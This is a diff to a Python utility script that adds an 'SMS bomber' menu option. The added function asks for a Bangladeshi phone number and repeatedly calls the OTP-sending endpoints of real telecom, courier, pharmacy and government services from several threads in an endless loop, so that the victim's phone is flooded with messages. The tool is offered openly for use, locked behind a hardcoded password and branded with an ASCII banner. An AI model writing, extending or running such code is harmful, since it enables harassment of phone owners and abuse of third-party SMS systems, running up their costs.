@@ -251,6 +251,126 @@ def mac_gen():
     print(GREEN + f"\nRandom MAC: {mac_addr}\n" + RESET)
 
 # ----------------------------- #
+# 23. Lucifer SMS Bomber
+# ----------------------------- #
+def Lucifer_Bomber():
+    import os
+    import time
+    import threading
+    import requests
+    RED = "\033[1;31m"
+    GREEN = "\033[1;32m"
+    RESET = "\033[0m"
+
+    PASSWORD = "Lucifer@143"
+
+    def banner():
+        os.system("cls" if os.name == "nt" else "clear")
+        print(f"""{RED}
+    ██╗     ██╗   ██╗ ██████╗██╗███████╗███████╗██████╗ 
+    ██║     ██║   ██║██╔════╝██║██╔════╝██╔════╝██╔══██╗
+    ██║     ██║   ██║██║     ██║█████╗  █████╗  ██████╔╝
+    ██║     ██║   ██║██║     ██║██╔══╝  ██╔══╝  ██╔══██╗
+    ███████╗╚██████╔╝╚██████╗██║██║     ███████╗██║  ██║
+    ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
+    {RESET}{GREEN}
+             LUCIFER BD SMS BOMBER v2.0
+               Developed by Foysal...
+    {RESET}""")
+
+    def password_prompt():
+        print("\033[1;31m[!] This tool is password protected.\033[0m")
+        pw = input("Enter password: ")
+        if pw != PASSWORD:
+            print("\033[1;31m[-] Incorrect Password. Exiting...\033[0m")
+            exit()
+        print("\033[1;32m[+] Access Granted!\033[0m")
+        time.sleep(1)
+
+    def menu():
+        banner()
+        print("\n\033[1;36m[1] Start SMS Bombing\n[2] Exit\033[0m")
+        choice = input("Select an option: ")
+        if choice == "1":
+            start_bombing()
+        else:
+            print("\033[1;31m[-] Exiting...\033[0m")
+            exit()
+
+    def get_target():
+        number = input("Enter target number (01XXXXXXXXX): ")
+        if number.startswith("01") and len(number) == 11:
+            return number, "880" + number[1:]
+        else:
+            print("Invalid number format.")
+            exit()
+
+    counter = 0
+    lock = threading.Lock()
+
+    def update_counter():
+        global counter
+        with lock:
+            counter += 1
+            print(f"\033[1;32m[+] SMS Sent: {counter}\033[0m")
+
+    def fast_apis(phone, full):
+        try:
+            requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={full}&lang=en&ng=0")
+            update_counter()
+        except:
+            pass
+
+        try:
+            requests.get(f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={phone}")
+            update_counter()
+        except:
+            pass
+
+    def normal_apis(phone, full):
+        apis = [
+            ("https://webloginda.grameenphone.com/backend/api/v1/otp", {"msisdn": full}),
+            ("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
+             {"phone": phone}),
+            ("https://api.osudpotro.com/api/v1/users/send_otp", {"phone": phone}),
+            ("https://api.apex4u.com/api/auth/login", {"phone": phone}),
+            ("https://bb-api.bohubrihi.com/public/activity/otp", {"phone": phone}),
+            ("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {"mobile": phone}),
+            ("https://training.gov.bd/backoffice/api/user/sendOtp", {"phone": phone}),
+            ("https://da-api.robi.com.bd/da-nll/otp/send", {"msisdn": full}),
+        ]
+
+        for url, data in apis:
+            try:
+                requests.post(url, json=data)
+                update_counter()
+            except:
+                pass
+
+    def start_bombing():
+        phone, full = get_target()
+        while True:
+            threads = []
+
+            for _ in range(3):
+                t = threading.Thread(target=fast_apis, args=(phone, full))
+                t.start()
+                threads.append(t)
+
+            t = threading.Thread(target=normal_apis, args=(phone, full))
+            t.start()
+            threads.append(t)
+
+            for t in threads:
+                t.join()
+            time.sleep(1)
+
+    if __name__ == "__main__":
+        banner()
+        password_prompt()
+        menu()
+
+# ----------------------------- #
 # Main Menu
 # ----------------------------- #
 def menu():
@@ -283,6 +403,7 @@ def menu():
 20. PDF → Text
 21. Clipboard Tools
 22. Random MAC Generator
+23. Lucifer SMS Bomber
 0. Exit
 """)
 
@@ -310,6 +431,7 @@ def menu():
         elif choice == "20": pdf_to_text()
         elif choice == "21": clipboard_tools()
         elif choice == "22": mac_gen()
+        elif choice == "23": Lucifer_Bomber()
         elif choice == "0":
             clear()
             print("Goodbye Lucifer!")
